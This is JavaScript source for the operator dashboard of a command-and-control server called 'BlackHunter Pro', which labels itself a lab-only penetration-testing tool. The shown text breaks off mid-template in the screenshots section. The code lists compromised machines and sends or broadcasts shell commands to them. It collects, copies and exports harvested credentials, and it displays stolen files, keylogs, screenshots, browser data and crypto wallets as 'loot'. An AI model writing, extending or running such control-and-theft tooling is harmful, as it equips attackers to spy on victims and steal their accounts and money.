/*
 * c2_server/web_ui/dashboard.js
 * BlackHunter Pro - Dashboard JavaScript
 * Complete frontend logic for the C2 Web Interface
 * Academic Penetration Testing Tool - Isolated Lab Only
 */

'use strict';

// =============================================
// CONFIGURATION
// =============================================

const CONFIG = {
    API_BASE: window.location.origin,
    WS_URL: `ws://${window.location.host}/ws`,
    REFRESH_INTERVAL: 5000,       // 5 seconds
    HEARTBEAT_INTERVAL: 30000,    // 30 seconds
    MAX_ACTIVITY: 100,
    MAX_OUTPUT_LENGTH: 10000,
    DEBUG: false,
};

// =============================================
// GLOBAL STATE
// =============================================

const State = {
    clients: [],
    commands: [],
    files: [],
    credentials: [],
    loot: [],
    screenshots: [],
    keylogs: [],
    activity: [],
    stats: {},

    currentView: 'dashboard',
    selectedClient: null,
    autoRefresh: true,
    notifications: true,

    ws: null,
    wsConnected: false,
    serverStartTime: Date.now(),
};

// =============================================
// UTILITY FUNCTIONS
// =============================================

const Utils = {
    // Format bytes
    formatBytes(bytes, decimals = 2) {
        if (bytes === 0) return '0 B';
        const k = 1024;
        const dm = decimals < 0 ? 0 : decimals;
        const sizes = ['B', 'KB', 'MB', 'GB', 'TB', 'PB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
    },

    // Format time ago
    timeAgo(timestamp) {
        const now = new Date();
        const then = new Date(timestamp);
        const seconds = Math.floor((now - then) / 1000);

        if (seconds < 5) return 'just now';
        if (seconds < 60) return `${seconds}s ago`;
        const minutes = Math.floor(seconds / 60);
        if (minutes < 60) return `${minutes}m ago`;
        const hours = Math.floor(minutes / 60);
        if (hours < 24) return `${hours}h ago`;
        const days = Math.floor(hours / 24);
        return `${days}d ago`;
    },

    // Format uptime
    formatUptime(seconds) {
        const days = Math.floor(seconds / 86400);
        const hours = Math.floor((seconds % 86400) / 3600);
        const minutes = Math.floor((seconds % 3600) / 60);
        const secs = Math.floor(seconds % 60);

        const parts = [];
        if (days > 0) parts.push(`${days}d`);
        if (hours > 0) parts.push(`${hours}h`);
        if (minutes > 0) parts.push(`${minutes}m`);
        parts.push(`${secs}s`);

        return parts.join(' ');
    },

    // Format date/time
    formatTime(timestamp) {
        const d = new Date(timestamp);
        return d.toLocaleTimeString('en-US', {
            hour12: false,
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        });
    },

    formatDateTime(timestamp) {
        const d = new Date(timestamp);
        return d.toLocaleString('en-US', {
            year: 'numeric',
            month: 'short',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            hour12: false
        });
    },

    // HTML escape
    escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    },

    // Truncate
    truncate(text, maxLen = 50) {
        if (!text) return '';
        if (text.length <= maxLen) return text;
        return text.substring(0, maxLen - 3) + '...';
    },

    // Debounce
    debounce(func, wait) {
        let timeout;
        return function executedFunction(...args) {
            const later = () => {
                clearTimeout(timeout);
                func(...args);
            };
            clearTimeout(timeout);
            timeout = setTimeout(later, wait);
        };
    },

    // Generate ID
    genId() {
        return Math.random().toString(36).substring(2, 15);
    },

    // Download file
    download(filename, content, type = 'text/plain') {
        const blob = new Blob([content], { type });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    },

    // Copy to clipboard
    async copyToClipboard(text) {
        try {
            await navigator.clipboard.writeText(text);
            return true;
        } catch (err) {
            // Fallback
            const textarea = document.createElement('textarea');
            textarea.value = text;
            document.body.appendChild(textarea);
            textarea.select();
            document.execCommand('copy');
            document.body.removeChild(textarea);
            return true;
        }
    },

    // Get status color class
    getStatusClass(status) {
        const map = {
            'active': 'success',
            'inactive': 'warning',
            'dead': 'danger',
            'online': 'success',
            'offline': 'danger',
        };
        return map[status] || 'secondary';
    },
};

// =============================================
// API CLIENT
// =============================================

const API = {
    async request(endpoint, options = {}) {
        const url = `${CONFIG.API_BASE}${endpoint}`;

        const defaultOptions = {
            headers: {
                'Content-Type': 'application/json',
            },
        };

        try {
            const response = await fetch(url, { ...defaultOptions, ...options });

            if (!response.ok) {
                throw new Error(`HTTP ${response.status}: ${response.statusText}`);
            }

            const contentType = response.headers.get('content-type');
            if (contentType && contentType.includes('application/json')) {
                return await response.json();
            }

            return await response.text();
        } catch (error) {
            Logger.error(`API request failed: ${endpoint}`, error);
            throw error;
        }
    },

    // GET requests
    async get(endpoint) {
        return this.request(endpoint, { method: 'GET' });
    },

    // POST requests
    async post(endpoint, data) {
        return this.request(endpoint, {
            method: 'POST',
            body: JSON.stringify(data),
        });
    },

    // API endpoints
    endpoints: {
        stats: () => API.get('/api/stats'),
        clients: () => API.get('/api/clients'),
        client: (id) => API.get(`/api/clients/${id}`),
        commands: (clientId) => API.get(`/api/commands${clientId ? `?client=${clientId}` : ''}`),
        files: () => API.get('/api/files'),
        credentials: () => API.get('/api/credentials'),
        loot: () => API.get('/api/loot'),
        screenshots: () => API.get('/api/screenshots'),
        keylogs: () => API.get('/api/keylogs'),

        sendCommand: (clientId, command) => API.post('/api/command', { client: clientId, command }),
        broadcast: (command) => API.post('/api/broadcast', { command }),
        killClient: (clientId) => API.post('/api/kill', { client: clientId }),

        downloadFile: (path) => API.get(`/api/download?path=${encodeURIComponent(path)}`),
        deleteFile: (path) => API.post('/api/delete', { path }),

        clearLogs: () => API.post('/api/clear-logs', {}),
        vacuumDb: () => API.post('/api/vacuum', {}),
        backupDb: () => API.post('/api/backup', {}),
        shutdown: () => API.post('/api/shutdown', {}),
    },
};

// =============================================
// LOGGER
// =============================================

const Logger = {
    log(level, message, data = null) {
        const timestamp = new Date().toISOString();
        const prefix = `[${timestamp}] [${level}]`;

        const colors = {
            'DEBUG': 'color: #6e7681',
            'INFO': 'color: #58a6ff',
            'WARN': 'color: #d29922',
            'ERROR': 'color: #f85149',
            'SUCCESS': 'color: #3fb950',
        };

        if (CONFIG.DEBUG || level !== 'DEBUG') {
            console.log(`%c${prefix} ${message}`, colors[level] || '', data || '');
        }
    },

    debug(msg, data) { this.log('DEBUG', msg, data); },
    info(msg, data) { this.log('INFO', msg, data); },
    warn(msg, data) { this.log('WARN', msg, data); },
    error(msg, data) { this.log('ERROR', msg, data); },
    success(msg, data) { this.log('SUCCESS', msg, data); },
};

// =============================================
// TOAST NOTIFICATIONS
// =============================================

const Toast = {
    container: null,

    init() {
        this.container = document.getElementById('toast-container');
    },

    show(title, message, type = 'info', duration = 3000) {
        if (!this.container) this.init();
        if (!State.notifications) return;

        const icons = {
            'info': 'ℹ️',
            'success': '✅',
            'warning': '⚠️',
            'error': '❌',
        };

        const toast = document.createElement('div');
        toast.className = `toast ${type}`;
        toast.innerHTML = `
            <div class="toast-icon">${icons[type] || icons.info}</div>
            <div class="toast-content">
                <div class="toast-title">${Utils.escapeHtml(title)}</div>
                ${message ? `<div class="toast-message">${Utils.escapeHtml(message)}</div>` : ''}
            </div>
        `;

        this.container.appendChild(toast);

        setTimeout(() => {
            toast.style.opacity = '0';
            toast.style.transform = 'translateX(50px)';
            setTimeout(() => toast.remove(), 300);
        }, duration);
    },

    success(title, message) { this.show(title, message, 'success'); },
    error(title, message) { this.show(title, message, 'error'); },
    warning(title, message) { this.show(title, message, 'warning'); },
    info(title, message) { this.show(title, message, 'info'); },
};

// =============================================
// MODAL MANAGER
// =============================================

const Modal = {
    open(modalId) {
        const modal = document.getElementById(modalId);
        if (modal) {
            modal.classList.add('active');
            document.body.style.overflow = 'hidden';
        }
    },

    close(modalId) {
        const modal = document.getElementById(modalId);
        if (modal) {
            modal.classList.remove('active');
            document.body.style.overflow = '';
        }
    },

    closeAll() {
        document.querySelectorAll('.modal.active').forEach(modal => {
            modal.classList.remove('active');
        });
        document.body.style.overflow = '';
    },

    confirm(title, message, onConfirm) {
        document.getElementById('modal-confirm-title').textContent = title;
        document.getElementById('modal-confirm-message').textContent = message;

        const yesBtn = document.getElementById('btn-confirm-yes');
        const noBtn = document.getElementById('btn-confirm-no');

        // Remove old listeners
        const newYes = yesBtn.cloneNode(true);
        const newNo = noBtn.cloneNode(true);
        yesBtn.parentNode.replaceChild(newYes, yesBtn);
        noBtn.parentNode.replaceChild(newNo, noBtn);

        newYes.addEventListener('click', () => {
            this.close('modal-confirm');
            if (onConfirm) onConfirm();
        });

        newNo.addEventListener('click', () => {
            this.close('modal-confirm');
        });

        this.open('modal-confirm');
    },

    showResult(title, output) {
        document.getElementById('modal-result-title').textContent = title;
        document.getElementById('modal-result-output').textContent = output;
        this.open('modal-command-result');
    },

    showImage(src, title = 'Screenshot') {
        document.getElementById('modal-image-title').textContent = title;
        document.getElementById('modal-image-src').src = src;
        this.open('modal-image-viewer');
    },
};

// =============================================
// LOADING OVERLAY
// =============================================

const Loading = {
    show(text = 'Loading...') {
        const overlay = document.getElementById('loading-overlay');
        overlay.querySelector('.loading-text').textContent = text;
        overlay.classList.add('active');
    },

    hide() {
        document.getElementById('loading-overlay').classList.remove('active');
    },
};

// =============================================
// WEBSOCKET MANAGER
// =============================================

const WebSocketManager = {
    connect() {
        try {
            this.ws = new WebSocket(CONFIG.WS_URL);

            this.ws.onopen = () => {
                Logger.success('WebSocket connected');
                State.wsConnected = true;
                this.updateStatus(true);
                this.startHeartbeat();
            };

            this.ws.onmessage = (event) => {
                try {
                    const message = JSON.parse(event.data);
                    this.handleMessage(message);
                } catch (err) {
                    Logger.error('WebSocket message error', err);
                }
            };

            this.ws.onclose = () => {
                Logger.warn('WebSocket disconnected');
                State.wsConnected = false;
                this.updateStatus(false);
                this.stopHeartbeat();

                // Reconnect after 5 seconds
                setTimeout(() => this.connect(), 5000);
            };

            this.ws.onerror = (error) => {
                Logger.error('WebSocket error', error);
            };

        } catch (err) {
            Logger.error('WebSocket connection failed', err);
        }
    },

    handleMessage(message) {
        const { type, data } = message;

        switch (type) {
            case 'client_connected':
                Toast.success('Client Connected', data.hostname || data.id);
                DataManager.loadClients();
                ActivityFeed.add(`Client connected: ${data.id}`, 'success');
                break;

            case 'client_disconnected':
                Toast.warning('Client Disconnected', data.id);
                DataManager.loadClients();
                ActivityFeed.add(`Client disconnected: ${data.id}`, 'warning');
                break;

            case 'command_result':
                if (data.output) {
                    Modal.showResult(`Command: ${data.command}`, data.output);
                }
                DataManager.loadCommands();
                ActivityFeed.add(`Command executed: ${data.command}`, 'info');
                break;

            case 'new_credential':
                Toast.warning('New Credential', `${data.username}@${data.client_id}`);
                DataManager.loadCredentials();
                ActivityFeed.add(`Credential captured: ${data.username}`, 'warning');
                break;

            case 'new_file':
                Toast.info('File Received', data.filename);
                DataManager.loadFiles();
                ActivityFeed.add(`File received: ${data.filename}`, 'info');
                break;

            case 'new_screenshot':
                Toast.info('Screenshot Captured', data.client_id);
                DataManager.loadScreenshots();
                ActivityFeed.add(`Screenshot captured`, 'info');
                break;

            case 'stats_update':
                State.stats = data;
                Stats.update();
                break;

            default:
                Logger.debug('Unknown WS message', message);
        }
    },

    send(message) {
        if (this.ws && this.ws.readyState === WebSocket.OPEN) {
            this.ws.send(JSON.stringify(message));
            return true;
        }
        return false;
    },

    startHeartbeat() {
        this.heartbeatTimer = setInterval(() => {
            this.send({ type: 'ping' });
        }, CONFIG.HEARTBEAT_INTERVAL);
    },

    stopHeartbeat() {
        if (this.heartbeatTimer) {
            clearInterval(this.heartbeatTimer);
        }
    },

    updateStatus(connected) {
        const dot = document.getElementById('server-status-dot');
        const text = document.getElementById('server-status-text');

        if (connected) {
            dot.classList.add('online');
            dot.classList.remove('offline');
            text.textContent = 'Connected';
        } else {
            dot.classList.add('offline');
            dot.classList.remove('online');
            text.textContent = 'Disconnected';
        }
    },
};

// =============================================
// DATA MANAGER
// =============================================

const DataManager = {
    async loadStats() {
        try {
            const stats = await API.endpoints.stats();
            State.stats = stats;
            Stats.update();
        } catch (err) {
            Logger.error('Failed to load stats', err);
        }
    },

    async loadClients() {
        try {
            const clients = await API.endpoints.clients();
            State.clients = clients;
            Clients.render();
            Sidebar.renderClients();
            CommandPanel.updateTargets();
            Stats.update();
        } catch (err) {
            Logger.error('Failed to load clients', err);
        }
    },

    async loadCommands() {
        try {
            const commands = await API.endpoints.commands();
            State.commands = commands;
            Commands.render();
        } catch (err) {
            Logger.error('Failed to load commands', err);
        }
    },

    async loadFiles() {
        try {
            const files = await API.endpoints.files();
            State.files = files;
            Files.render();
        } catch (err) {
            Logger.error('Failed to load files', err);
        }
    },

    async loadCredentials() {
        try {
            const creds = await API.endpoints.credentials();
            State.credentials = creds;
            Credentials.render();
            Stats.update();
        } catch (err) {
            Logger.error('Failed to load credentials', err);
        }
    },

    async loadLoot() {
        try {
            const loot = await API.endpoints.loot();
            State.loot = loot;
            Loot.render();
        } catch (err) {
            Logger.error('Failed to load loot', err);
        }
    },

    async loadScreenshots() {
        try {
            const screenshots = await API.endpoints.screenshots();
            State.screenshots = screenshots;
            Screenshots.render();
        } catch (err) {
            Logger.error('Failed to load screenshots', err);
        }
    },

    async loadKeylogs() {
        try {
            const keylogs = await API.endpoints.keylogs();
            State.keylogs = keylogs;
            Keylogs.render();
        } catch (err) {
            Logger.error('Failed to load keylogs', err);
        }
    },

    async sendCommand(clientId, command) {
        if (!clientId || !command) {
            Toast.warning('Invalid command', 'Select a client and enter a command');
            return false;
        }

        try {
            Toast.info('Sending', `Command: ${command}`);
            await API.endpoints.sendCommand(clientId, command);
            Toast.success('Command Sent', command);
            ActivityFeed.add(`Command sent to ${clientId}: ${command}`, 'info');
            return true;
        } catch (err) {
            Toast.error('Command Failed', err.message);
            return false;
        }
    },

    async broadcast(command) {
        if (!command) return;

        try {
            await API.endpoints.broadcast(command);
            Toast.success('Broadcast Sent', command);
            ActivityFeed.add(`Broadcast: ${command}`, 'info');
        } catch (err) {
            Toast.error('Broadcast Failed', err.message);
        }
    },

    async killClient(clientId) {
        try {
            await API.endpoints.killClient(clientId);
            Toast.success('Client Killed', clientId);
            ActivityFeed.add(`Client killed: ${clientId}`, 'warning');
            this.loadClients();
        } catch (err) {
            Toast.error('Kill Failed', err.message);
        }
    },

    async refreshAll() {
        await Promise.all([
            this.loadStats(),
            this.loadClients(),
            this.loadCommands(),
            this.loadFiles(),
            this.loadCredentials(),
        ]);
    },
};

// =============================================
// STATS
// =============================================

const Stats = {
    update() {
        const stats = State.stats;

        // Header
        document.getElementById('header-clients').textContent = stats.active_clients || State.clients.length || 0;
        document.getElementById('header-commands').textContent = stats.total_commands || 0;

        // Dashboard cards
        document.getElementById('card-active-clients').textContent = stats.active_clients || 0;
        document.getElementById('card-commands').textContent = stats.total_commands || 0;
        document.getElementById('card-credentials').textContent = stats.total_credentials || 0;
        document.getElementById('card-files').textContent = stats.total_files || 0;

        // Sidebar badges
        document.getElementById('nav-clients-badge').textContent = stats.active_clients || 0;
        document.getElementById('nav-creds-badge').textContent = stats.total_credentials || 0;

        // Sidebar mini stats
        document.getElementById('stat-sessions').textContent = stats.total_clients || 0;
        document.getElementById('stat-files').textContent = stats.total_files || 0;
        document.getElementById('stat-data').textContent = Utils.formatBytes(stats.total_bytes || 0);

        // Uptime
        const uptime = (Date.now() - State.serverStartTime) / 1000;
        const uptimeStr = Utils.formatUptime(uptime);
        document.getElementById('stat-uptime').textContent = uptimeStr;
        document.getElementById('footer-uptime').textContent = uptimeStr;
        document.getElementById('quick-uptime').textContent = uptimeStr;

        // Quick stats
        document.getElementById('quick-sessions').textContent = stats.total_clients || 0;
    },
};

// =============================================
// ACTIVITY FEED
// =============================================

const ActivityFeed = {
    add(text, type = 'info') {
        const icons = {
            'info': 'ℹ️',
            'success': '✅',
            'warning': '⚠️',
            'danger': '❌',
        };

        const item = {
            text,
            type,
            time: new Date().toISOString(),
        };

        State.activity.unshift(item);

        if (State.activity.length > CONFIG.MAX_ACTIVITY) {
            State.activity.pop();
        }

        this.render();
    },

    render() {
        const feed = document.getElementById('activity-feed');

        if (!State.activity.length) {
            feed.innerHTML = `
                <div class="empty-state">
                    <span class="empty-icon">📭</span>
                    <span>No activity yet</span>
                </div>
            `;
            return;
        }

        const icons = {
            'info': 'ℹ️',
            'success': '✅',
            'warning': '⚠️',
            'danger': '❌',
        };

        feed.innerHTML = State.activity.slice(0, 20).map(item => `
            <div class="activity-item ${item.type}">
                <div class="activity-icon">${icons[item.type] || icons.info}</div>
                <div class="activity-content">
                    <div class="activity-text">${Utils.escapeHtml(item.text)}</div>
                    <div class="activity-time">${Utils.timeAgo(item.time)}</div>
                </div>
            </div>
        `).join('');
    },

    clear() {
        State.activity = [];
        this.render();
    },
};

// =============================================
// CLIENTS
// =============================================

const Clients = {
    render() {
        this.renderTable();
        this.renderCards();
    },

    renderTable() {
        const tbody = document.getElementById('clients-tbody');

        if (!State.clients.length) {
            tbody.innerHTML = `
                <tr>
                    <td colspan="9" class="empty-table">
                        <div class="empty-state">
                            <span class="empty-icon">👥</span>
                            <span>No clients connected</span>
                        </div>
                    </td>
                </tr>
            `;
            return;
        }

        tbody.innerHTML = State.clients.map(client => {
            const statusClass = Utils.getStatusClass(client.status);
            const isSelected = State.selectedClient === client.client_id;

            return `
                <tr data-client="${client.client_id}" class="${isSelected ? 'selected' : ''}">
                    <td><input type="checkbox" class="client-checkbox" value="${client.client_id}"></td>
                    <td><span class="text-mono">${Utils.truncate(client.client_id, 12)}</span></td>
                    <td><span class="text-mono">${client.ip || 'N/A'}</span></td>
                    <td>${Utils.escapeHtml(client.hostname || 'unknown')}</td>
                    <td>${Utils.escapeHtml(Utils.truncate(client.os || 'unknown', 20))}</td>
                    <td>${Utils.escapeHtml(client.user || 'unknown')}</td>
                    <td><span class="status-badge ${statusClass}">${client.status}</span></td>
                    <td><span class="text-muted text-mono">${Utils.timeAgo(client.last_seen)}</span></td>
                    <td>
                        <div class="table-actions">
                            <button class="btn-icon-small" onclick="Clients.select('${client.client_id}')" title="Select">✔️</button>
                            <button class="btn-icon-small" onclick="Clients.showInfo('${client.client_id}')" title="Info">ℹ️</button>
                            <button class="btn-icon-small" onclick="Clients.kill('${client.client_id}')" title="Kill">⛔</button>
                        </div>
                    </td>
                </tr>
            `;
        }).join('');
    },

    renderCards() {
        const container = document.getElementById('dashboard-client-cards');

        if (!State.clients.length) {
            container.innerHTML = `
                <div class="empty-state">
                    <span class="empty-icon">👥</span>
                    <span>No clients connected</span>
                </div>
            `;
            return;
        }

        container.innerHTML = State.clients.slice(0, 8).map(client => `
            <div class="client-card" onclick="Clients.select('${client.client_id}')">
                <div class="client-card-header">
                    <span class="client-card-id">${Utils.truncate(client.client_id, 12)}</span>
                    <span class="client-card-status">
                        <span class="status-dot online"></span>
                        ${client.status}
                    </span>
                </div>
                <div class="client-card-body">
                    <div class="client-card-row">
                        <span class="client-card-label">IP:</span>
                        <span class="client-card-value">${client.ip || 'N/A'}</span>
                    </div>
                    <div class="client-card-row">
                        <span class="client-card-label">Host:</span>
                        <span class="client-card-value">${Utils.truncate(client.hostname || 'unknown', 15)}</span>
                    </div>
                    <div class="client-card-row">
                        <span class="client-card-label">OS:</span>
                        <span class="client-card-value">${Utils.truncate(client.os || 'unknown', 15)}</span>
                    </div>
                    <div class="client-card-row">
                        <span class="client-card-label">User:</span>
                        <span class="client-card-value">${Utils.truncate(client.user || 'unknown', 15)}</span>
                    </div>
                </div>
            </div>
        `).join('');
    },

    select(clientId) {
        State.selectedClient = clientId;
        Logger.info(`Selected client: ${clientId}`);
        Toast.info('Selected', clientId);
        this.renderTable();
        CommandPanel.updateTargets();
    },

    showInfo(clientId) {
        const client = State.clients.find(c => c.client_id === clientId);
        if (!client) return;

        document.getElementById('modal-client-title').textContent = `Client: ${clientId}`;

        const body = document.getElementById('modal-client-body');
        const info = typeof client.info === 'string' ? JSON.parse(client.info || '{}') : (client.info || {});

        body.innerHTML = `
            <div class="info-grid" style="display: grid; grid-template-columns: 1fr 1fr; gap: 16px;">
                <div class="info-item">
                    <label style="color: var(--text-muted); font-size: 11px; text-transform: uppercase;">Client ID</label>
                    <div class="text-mono">${clientId}</div>
                </div>
                <div class="info-item">
                    <label style="color: var(--text-muted); font-size: 11px; text-transform: uppercase;">Status</label>
                    <div><span class="status-badge ${Utils.getStatusClass(client.status)}">${client.status}</span></div>
                </div>
                <div class="info-item">
                    <label style="color: var(--text-muted); font-size: 11px; text-transform: uppercase;">IP Address</label>
                    <div class="text-mono">${client.ip || 'N/A'}</div>
                </div>
                <div class="info-item">
                    <label style="color: var(--text-muted); font-size: 11px; text-transform: uppercase;">Hostname</label>
                    <div>${Utils.escapeHtml(client.hostname || 'N/A')}</div>
                </div>
                <div class="info-item">
                    <label style="color: var(--text-muted); font-size: 11px; text-transform: uppercase;">Operating System</label>
                    <div>${Utils.escapeHtml(client.os || 'N/A')}</div>
                </div>
                <div class="info-item">
                    <label style="color: var(--text-muted); font-size: 11px; text-transform: uppercase;">User</label>
                    <div>${Utils.escapeHtml(client.user || 'N/A')}</div>
                </div>
                <div class="info-item">
                    <label style="color: var(--text-muted); font-size: 11px; text-transform: uppercase;">First Seen</label>
                    <div class="text-mono">${Utils.formatDateTime(client.first_seen)}</div>
                </div>
                <div class="info-item">
                    <label style="color: var(--text-muted); font-size: 11px; text-transform: uppercase;">Last Seen</label>
                    <div class="text-mono">${Utils.formatDateTime(client.last_seen)}</div>
                </div>
            </div>
        `;

        Modal.open('modal-client-info');
    },

    kill(clientId) {
        Modal.confirm(
            'Disconnect Client',
            `Are you sure you want to disconnect ${clientId}?`,
            () => DataManager.killClient(clientId)
        );
    },

    killAll() {
        Modal.confirm(
            'Disconnect All',
            'Are you sure you want to disconnect ALL clients?',
            () => {
                State.clients.forEach(c => DataManager.killClient(c.client_id));
            }
        );
    },
};

// =============================================
// SIDEBAR CLIENT LIST
// =============================================

const Sidebar = {
    renderClients() {
        const container = document.getElementById('sidebar-client-list');
        const countEl = document.getElementById('sidebar-clients-count');

        countEl.textContent = State.clients.length;

        if (!State.clients.length) {
            container.innerHTML = '<div class="empty-state-small">No clients connected</div>';
            return;
        }

        container.innerHTML = State.clients.slice(0, 20).map(client => `
            <div class="client-item ${State.selectedClient === client.client_id ? 'active' : ''}"
                 onclick="Clients.select('${client.client_id}')">
                <span class="client-item-status"></span>
                <div class="client-item-info">
                    <div class="client-item-name">${Utils.truncate(client.hostname || client.client_id, 15)}</div>
                    <div class="client-item-ip">${client.ip || 'N/A'}</div>
                </div>
            </div>
        `).join('');
    },
};

// =============================================
// COMMAND PANEL
// =============================================

const CommandPanel = {
    updateTargets() {
        const select = document.getElementById('command-target');
        const current = select.value;

        select.innerHTML = '<option value="">-- Select Client --</option>' +
            State.clients.map(c => `
                <option value="${c.client_id}" ${current === c.client_id ? 'selected' : ''}>
                    ${Utils.truncate(c.hostname || c.client_id, 20)} (${c.ip})
                </option>
            `).join('');
    },

    async send() {
        const target = document.getElementById('command-target').value;
        const command = document.getElementById('command-input').value.trim();

        if (!target) {
            Toast.warning('No Target', 'Please select a client first');
            return;
        }

        if (!command) {
            Toast.warning('No Command', 'Please enter a command');
            return;
        }

        const success = await DataManager.sendCommand(target, command);

        if (success) {
            document.getElementById('command-input').value = '';
            setTimeout(() => DataManager.loadCommands(), 1000);
        }
    },
};

// =============================================
// COMMANDS
// =============================================

const Commands = {
    render() {
        const container = document.getElementById('command-history');

        if (!State.commands.length) {
            container.innerHTML = `
                <div class="empty-state">
                    <span class="empty-icon">💻</span>
                    <span>No commands executed yet</span>
                </div>
            `;
            return;
        }

        container.innerHTML = State.commands.slice(0, 50).map(cmd => {
            const status = cmd.exit_code === 0 ? 'success' : 'failed';
            return `
                <div class="command-item ${status}">
                    <div class="command-header">
                        <span class="command-text">${Utils.escapeHtml(cmd.command)}</span>
                        <div class="command-meta">
                            <span>${Utils.escapeHtml(cmd.client_id || '')}</span>
                            <span>exit: ${cmd.exit_code}</span>
                            <span>${cmd.duration ? cmd.duration.toFixed(2) + 's' : ''}</span>
                            <span>${Utils.timeAgo(cmd.sent_at)}</span>
                        </div>
                    </div>
                    ${cmd.output ? `
                        <div class="command-output">${Utils.escapeHtml(Utils.truncate(cmd.output, 500))}</div>
                    ` : ''}
                </div>
            `;
        }).join('');
    },

    clear() {
        State.commands = [];
        this.render();
        Toast.success('Cleared', 'Command history cleared');
    },
};

// =============================================
// FILES
// =============================================

const Files = {
    render() {
        const tbody = document.getElementById('files-tbody');

        if (!State.files.length) {
            tbody.innerHTML = `
                <tr>
                    <td colspan="7" class="empty-table">
                        <div class="empty-state">
                            <span class="empty-icon">📁</span>
                            <span>No files transferred</span>
                        </div>
                    </td>
                </tr>
            `;
            return;
        }

        tbody.innerHTML = State.files.map(file => `
            <tr>
                <td>📄 ${Utils.escapeHtml(Utils.truncate(file.filename, 30))}</td>
                <td class="text-mono">${Utils.truncate(file.client_id || 'N/A', 12)}</td>
                <td class="text-mono">${Utils.formatBytes(file.filesize || 0)}</td>
                <td>
                    <span class="status-badge ${file.direction === 'download' ? 'active' : 'inactive'}">
                        ${file.direction === 'download' ? '⬇ Download' : '⬆ Upload'}
                    </span>
                </td>
                <td class="text-mono">${Utils.truncate(file.hash || 'N/A', 16)}</td>
                <td class="text-muted">${Utils.timeAgo(file.transferred_at)}</td>
                <td>
                    <div class="table-actions">
                        <button class="btn-icon-small" onclick="Files.download('${Utils.escapeHtml(file.local_path || '')}')" title="Download">⬇</button>
                        <button class="btn-icon-small" onclick="Files.delete('${file.id}')" title="Delete">🗑️</button>
                    </div>
                </td>
            </tr>
        `).join('');
    },

    download(path) {
        if (path) {
            window.open(`${CONFIG.API_BASE}/api/download?path=${encodeURIComponent(path)}`, '_blank');
        }
    },

    delete(fileId) {
        Modal.confirm(
            'Delete File',
            'Are you sure you want to delete this file?',
            async () => {
                try {
                    await API.endpoints.deleteFile(fileId);
                    Toast.success('Deleted', 'File deleted');
                    DataManager.loadFiles();
                } catch (err) {
                    Toast.error('Delete Failed', err.message);
                }
            }
        );
    },
};

// =============================================
// CREDENTIALS
// =============================================

const Credentials = {
    render() {
        const tbody = document.getElementById('credentials-tbody');

        if (!State.credentials.length) {
            tbody.innerHTML = `
                <tr>
                    <td colspan="6" class="empty-table">
                        <div class="empty-state">
                            <span class="empty-icon">🔑</span>
                            <span>No credentials harvested</span>
                        </div>
                    </td>
                </tr>
            `;
            return;
        }

        tbody.innerHTML = State.credentials.map(cred => `
            <tr>
                <td><strong>${Utils.escapeHtml(cred.username || 'N/A')}</strong></td>
                <td class="text-mono text-danger">${Utils.escapeHtml(Utils.truncate(cred.password || cred.hash || 'N/A', 30))}</td>
                <td>${Utils.escapeHtml(cred.source || 'N/A')}</td>
                <td class="text-mono">${Utils.truncate(cred.client_id || 'N/A', 12)}</td>
                <td class="text-muted">${Utils.timeAgo(cred.captured_at)}</td>
                <td>
                    <button class="btn-icon-small" onclick="Credentials.copy('${Utils.escapeHtml(cred.username || '')}', '${Utils.escapeHtml(cred.password || cred.hash || '')}')" title="Copy">📋</button>
                </td>
            </tr>
        `).join('');
    },

    async copy(username, password) {
        await Utils.copyToClipboard(`${username}:${password}`);
        Toast.success('Copied', 'Credentials copied to clipboard');
    },

    export() {
        if (!State.credentials.length) {
            Toast.warning('Nothing to export', '');
            return;
        }

        const lines = State.credentials.map(c =>
            `${c.username}:${c.password || c.hash || ''}:${c.source || ''}:${c.client_id || ''}`
        );

        Utils.download(`credentials_${Date.now()}.txt`, lines.join('\n'));
        Toast.success('Exported', `${lines.length} credentials`);
    },
};

// =============================================
// LOOT
// =============================================

const Loot = {
    render() {
        const container = document.getElementById('loot-grid');

        if (!State.loot.length) {
            container.innerHTML = `
                <div class="empty-state">
                    <span class="empty-icon">💎</span>
                    <span>No loot collected</span>
                </div>
            `;
            return;
        }

        const icons = {
            'credential': '🔑',
            'screenshot': '📸',
            'keylog': '⌨️',
            'file': '📁',
            'browser': '🌐',
            'wallet': '💰',
        };

        container.innerHTML = State.loot.map(item => `
            <div class="loot-card">
                <div class="loot-card-header">
                    <div class="loot-card-icon">${icons[item.loot_type] || '💎'}</div>
                    <div>
                        <div class="loot-card-title">${Utils.escapeHtml(Utils.truncate(item.name || 'Unknown', 20))}</div>
                        <div class="loot-card-type">${item.loot_type}</div>
                    </div>
                </div>
                <div class="loot-card-body">
                    <div class="loot-card-row">
                        <span class="loot-card-label">Client:</span>
                        <span class="loot-card-value">${Utils.truncate(item.client_id || 'N/A', 12)}</span>
                    </div>
                    <div class="loot-card-row">
                        <span class="loot-card-label">Captured:</span>
                        <span class="loot-card-value">${Utils.timeAgo(item.captured_at)}</span>
                    </div>
                </div>
            </div>
        `).join('');
    },

    export() {
        if (!State.loot.length) return;
        Utils.download(`loot_${Date.now()}.json`, JSON.stringify(State.loot, null, 2), 'application/json');
        Toast.success('Exported', `${State.loot.length} items`);
    },
};

// =============================================
// SCREENSHOTS
// =============================================

const Screenshots = {
    render() {
        const container = document.getElementById('screenshots-gallery');

        if (!State.screenshots.length) {
            container.innerHTML = `
                <div class="empty-state">
                    <span class="empty-icon">📸</span>
                    <span>No screenshots captured</span>
                </div>
            `;
            return;
        }

        container.innerHTML = State.screenshots.map(shot => `
            <div class="gallery-item" onclick="Screenshots.view('${shot.file_path}', '${Utils.escapeHtml(shot.client_id)}')">
                <img src="/screenshots/${Utils.escapeHtml(shot.file_path)}" alt="Screenshot" loading="lazy" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22%3E%3Ctext y=%22.9em%22 font-size=%2290%22%3E📸%3C/text%3E%3C/svg%3E'">
                <div class="gallery-item-info">
                    <div class="gallery-item-title">${Utils.truncate(shot.client_id, 15)}</div>
